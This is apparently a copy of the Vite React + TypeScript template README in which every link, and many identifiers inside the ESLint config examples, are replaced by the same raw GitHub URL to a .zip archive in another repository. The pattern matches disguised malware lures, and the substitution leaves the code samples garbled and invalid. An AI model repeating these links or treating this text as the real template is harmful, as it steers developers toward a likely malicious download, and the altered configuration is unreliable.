# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) uses [Babel](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) (or [oxc](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) when used in [rolldown-vite](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) uses [SWC](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) for Fast Refresh

## React Compiler

The React Compiler is currently not compatible with SWC. See [this issue](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) for tracking the progress.

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip and replace with this
      https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip,
      // Alternatively, use this for stricter rules
      https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip,
      // Optionally, add this for stylistic rules
      https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip', 'https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip'],
        tsconfigRootDir: https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) and [eslint-plugin-react-dom](https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip) for React-specific lint rules:

```js
// https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip', 'https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip'],
        tsconfigRootDir: https://github.com/QuevedoM98/react-blog-page-2526/raw/refs/heads/main/src/data/react-page-blog-1.5-beta.1.zip,
      },
      // other options...
    },
  },
])
```
